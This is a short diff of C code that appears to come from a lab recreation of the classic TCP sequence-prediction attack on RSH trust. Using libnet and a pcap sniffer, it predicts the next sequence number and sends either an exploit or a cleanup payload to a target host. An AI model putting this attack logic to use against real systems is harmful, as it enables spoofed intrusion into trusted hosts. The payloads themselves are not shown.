@@ -82,18 +82,21 @@ int main(int argc, char **argv)
     //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
 
-    uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
-    libnet_clear_packet(l);
-    printf("\nNext: %u",next);
-    fflush(stdout);
+
     if (clean==0)
     {
+        uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
+        libnet_clear_packet(l);
+        printf("\nNext: %u",next);
         //Exploiting RSH
         printf("\nEXPLOITING");
         sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
     }
     else
     {
+        uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
+        libnet_clear_packet(l);
+        printf("\nNext: %u",next);
         printf("\nCLEANING");
         sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
     }
